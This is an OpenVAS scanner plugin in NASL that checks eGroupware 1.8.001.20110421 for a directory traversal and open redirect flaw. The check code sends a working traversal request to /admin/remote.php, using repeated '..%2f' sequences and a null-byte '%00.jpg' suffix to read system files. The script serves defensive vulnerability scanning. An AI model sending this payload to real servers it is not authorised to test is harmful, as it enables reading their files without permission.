###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_egroupware_mult_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# eGroupware Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:egroupware:egroupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801944");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_cve_id("CVE-2011-4951", "CVE-2011-4950", "CVE-2011-4949", "CVE-2011-4948");
  script_bugtraq_id(52770);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("eGroupware Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_egroupware_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("egroupware/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17322/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101676/eGroupware1.8.001.20110421-LFI.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101675/eGroupware1.8.001.20110421-Redirect.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application or to redirect to an arbitrary URL.");

  script_tag(name:"affected", value:"eGroupware version 1.8.001.20110421");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - An input validation error in 'type' parameter to '/admin/remote.php?', which
  allows attackers to read arbitrary files via a ..%2f(dot dot) sequences.

  - An open redirect vulnerability in '/phpgwapi/ntlm/index.php?', when handling
  the URL.");

  script_tag(name:"solution", value:"Upgrade to version 1.8.001.20110805 or later.");

  script_tag(name:"summary", value:"This host is running the eGroupware and is prone to multiple
  vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.egroupware.org");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){

  url = string(dir, "/admin/remote.php?uid=a&type=", crap(data:"..%2f", length:3*15), files[file], "%00.jpg&creator_email=a");

  if(http_vuln_check(port:port, url:url, pattern:file)){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);